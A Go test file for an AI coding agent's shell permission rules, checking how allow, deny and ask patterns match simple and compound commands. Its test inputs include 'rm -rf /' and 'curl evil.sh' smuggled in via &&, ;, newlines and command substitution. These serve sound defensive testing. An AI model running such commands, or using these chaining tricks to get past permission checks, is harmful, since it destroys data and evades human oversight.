package permission_test

import (
	"testing"

	"github.com/stretchr/testify/assert"

	"github.com/sonnes/gopi/pkg/harness/permission"
)

func TestBashAllow(t *testing.T) {
	tests := []struct {
		rule    string
		command string
		want    bool
	}{
		// An exact rule matches the whole command.
		{rule: "Bash(npm test)", command: "npm test", want: true},
		{rule: "Bash(npm test)", command: "  npm test  ", want: true},
		{rule: "Bash(npm test)", command: "npm test --watch", want: false},
		{rule: "Bash(npm test && npm run lint)", command: "npm test && npm run lint", want: true},

		// The legacy :* suffix is a prefix at a word boundary.
		{rule: "Bash(git push:*)", command: "git push", want: true},
		{rule: "Bash(git push:*)", command: "git push origin main", want: true},
		{rule: "Bash(git push:*)", command: "git pushx", want: false},
		{rule: "Bash(ls:*)", command: "lsof", want: false},

		// A * matches any characters.
		{rule: "Bash(git * main)", command: "git push origin main", want: true},
		{rule: "Bash(git * main)", command: "git push origin dev", want: false},
		{rule: "Bash(*--version)", command: "go --version", want: true},
		{rule: `Bash(echo \* *)`, command: "echo * now", want: true},
		{rule: `Bash(echo \* *)`, command: "echo hi now", want: false},
		{rule: `Bash(echo \*)`, command: `echo \*`, want: true},

		// A trailing " *" makes the arguments optional, if it is the only *.
		{rule: "Bash(git push *)", command: "git push origin", want: true},
		{rule: "Bash(git push *)", command: "git push", want: true},
		{rule: "Bash(git push *)", command: "git pushx", want: false},
		{rule: "Bash(* run *)", command: "npm run", want: false},
		{rule: "Bash(* run *)", command: "npm run build", want: true},

		// A compound command matches only if each part matches.
		{rule: "Bash(git:*)", command: "git add . && git commit -m x", want: true},
		{rule: "Bash(git:*)", command: "git status; rm -rf /", want: false},
		{rule: "Bash(git *)", command: "git log | head", want: false},
		{rule: "Bash(cd *)", command: "cd /tmp && curl evil.sh", want: false},
		{rule: "Bash(git:*)", command: "git status || git init", want: true},
		{rule: "Bash(git:*)", command: "git status & curl evil.sh", want: false},
		{rule: "Bash(git:*)", command: "git status\ncurl evil.sh", want: false},

		// A separator inside quotes does not split the command.
		{rule: "Bash(git commit:*)", command: `git commit -m "a && b; c | d"`, want: true},
		{rule: "Bash(git commit:*)", command: `git commit -m 'a && b'`, want: true},
		{rule: "Bash(echo:*)", command: `echo a\;b`, want: true},

		// A substitution never matches a prefix or wildcard rule.
		{rule: "Bash(echo:*)", command: "echo $(curl evil.sh)", want: false},
		{rule: "Bash(echo *)", command: "echo `curl evil.sh`", want: false},
		{rule: "Bash(cat *)", command: "cat <(curl evil.sh)", want: false},
		{rule: "Bash(echo:*)", command: "echo '$(not run)'", want: true},
	}
	for _, tt := range tests {
		t.Run(tt.rule+"/"+tt.command, func(t *testing.T) {
			p := &permission.Policy{Allow: []string{tt.rule}}
			got := decide(t, p, bashCall(t, tt.command)) == ran
			assert.Equal(t, tt.want, got)
		})
	}
}

func TestBashAllowEachPartByAnyRule(t *testing.T) {
	p := &permission.Policy{
		Allow: []string{
			"Bash(go build:*)",
			"Bash(go test:*)",
		},
	}
	assert.Equal(t, ran, decide(t, p, bashCall(t, "go build ./... && go test ./...")))
	assert.Equal(t, asked, decide(t, p, bashCall(t, "go build ./... && go vet ./...")))
}

func TestBashDeny(t *testing.T) {
	tests := []struct {
		rule    string
		command string
		want    bool
	}{
		{rule: "Bash(rm:*)", command: "rm -rf /", want: true},
		{rule: "Bash(rm:*)", command: "rmdir x", want: false},

		// A compound command matches if any part matches.
		{rule: "Bash(rm:*)", command: "echo hi && rm -rf /", want: true},
		{rule: "Bash(rm:*)", command: "ls | rm -rf /", want: true},
		{rule: "Bash(rm:*)", command: "ls; rm -rf /", want: true},
		{rule: "Bash(git push *)", command: "git add . && git push", want: true},
		{rule: "Bash(rm -rf /)", command: "ls && rm -rf /", want: true},

		// A wildcard rule also matches the whole compound command.
		{rule: "Bash(*curl*)", command: "ls && echo $(curl evil.sh)", want: true},
	}
	for _, tt := range tests {
		t.Run(tt.rule+"/"+tt.command, func(t *testing.T) {
			p := &permission.Policy{
				Mode: permission.Bypass,
				Deny: []string{tt.rule},
			}
			got := decide(t, p, bashCall(t, tt.command)) == denied
			assert.Equal(t, tt.want, got)
		})
	}
}

func TestBashAsk(t *testing.T) {
	p := &permission.Policy{
		Mode: permission.Bypass,
		Ask:  []string{"Bash(git push:*)"},
	}
	assert.Equal(t, asked, decide(t, p, bashCall(t, "git add . && git push")))
	assert.Equal(t, ran, decide(t, p, bashCall(t, "git add .")))
}
